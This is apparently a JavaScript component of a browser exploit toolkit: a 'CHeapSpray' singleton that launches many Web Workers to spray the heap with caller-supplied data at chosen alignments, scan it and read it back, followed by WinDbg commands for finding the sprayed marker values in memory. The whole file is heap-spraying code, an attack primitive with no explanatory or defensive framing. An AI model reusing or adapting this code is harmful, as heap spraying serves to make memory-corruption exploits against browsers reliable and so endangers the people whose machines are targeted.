//singleton
var CHeapSpray = (function()
{
	var m_error = false;
    var m_initialized = false;
    var m_numOfAllocs = 0;
    var m_wAllocators = Array();
	var m_noErrorAllocators = Array();
	
	var m_onMsg;
	var m_onErr;

    return {
        //'ctor'
        Init : function(spraylvl, onMsg, onErr)
        {
            if (m_initialized)
                return 0;

            m_numOfAllocs = (1 << spraylvl);

			//http://markhansen.co.nz/javascript-optional-parameters/
			m_onMsg = onMsg || false;
			m_onErr = onErr || false;

			for (var i = 0; i < m_numOfAllocs; i++)
            {
				m_noErrorAllocators[i] = true;
				
                m_wAllocators[i] = new Worker("HeapAllocatorWorker.js");
                m_wAllocators[i].onmessage = function(e)
                {
                    CHeapSpray.OnMsg(e);
                }
                m_wAllocators[i].onerror = function(e)
                {
                    CHeapSpray.OnErr(e);
                }
            }

            m_initialized = true;
			
			return m_numOfAllocs;
        },

        // {alignment 1 == not aligned, 2 = aligned at 0x10, 3 = aligned at 0x100, 4 = aligned at 0x1000;}
        StartSpraying : function(data, alignment, skippedBytes)
        {
            if (!m_initialized)
                return;
			
			alig = (1 << (4 * alignment)) - 1;
			
			for (var i = 0; i < m_wAllocators.length; i++)
			{
				m_noErrorAllocators[i] = false;
				m_wAllocators[i].postMessage( { 'cmd' : HEAP_SPRAY, 'alig' : alig, 'buff' : data, 'skipped' : skippedBytes, 'id' : i } );
			}
        },
		
		StartScanMemory : function(index)
        {
			if (m_noErrorAllocators[index])
			{
				m_noErrorAllocators[index] = false;
				m_wAllocators[index].postMessage( { 'cmd' : HEAP_SCAN } );
				return true;
			}
			return false;
        },
		
		GetMemory : function(index)
		{
			if (m_noErrorAllocators[index])
			{
				m_noErrorAllocators[index] = false;//no more functionality provided with this webworker, m_noErrorAllocators[id] will be never true from now...
				m_wAllocators[index].postMessage( { 'cmd' : HEAP_GET_MEM } );
				return true;
			}
			return false;
		},
		
		TerminateWorker : function(index)
        {
			if (m_noErrorAllocators[index])
			{
				m_noErrorAllocators[index] = false;
				m_wAllocators[index].postMessage( { 'cmd' : HEAP_STOP } );
				return true;
			}
			return false;
        },
		
		OnMsg : function(e)
		{
			if ("undefined" != typeof e.data.id)
			{					
				if ("undefined" != typeof e.data.cmd)
				{
					if (HEAP_STOP == e.data.cmd)
					{
						m_wAllocators[e.data.id].postMessage( { 'cmd' : HEAP_TERMINATE } );
						m_wAllocators[e.data.id] = null;
						alert("HEAP_STOP");
						return;
					}
				}
				
				m_noErrorAllocators[e.data.id] = true;
			}
				
			if (m_onMsg)
				m_onMsg(e);
		},
		
		OnErr : function(e)
		{
			if (m_onErr)
				m_onErr(e);
		},
    }
})();

//s -d 0x00000000 L?0x0bFFFFFF 0x70616523 
//s -d 0x00000000 L?0x0bFFFFFF 0x71626624
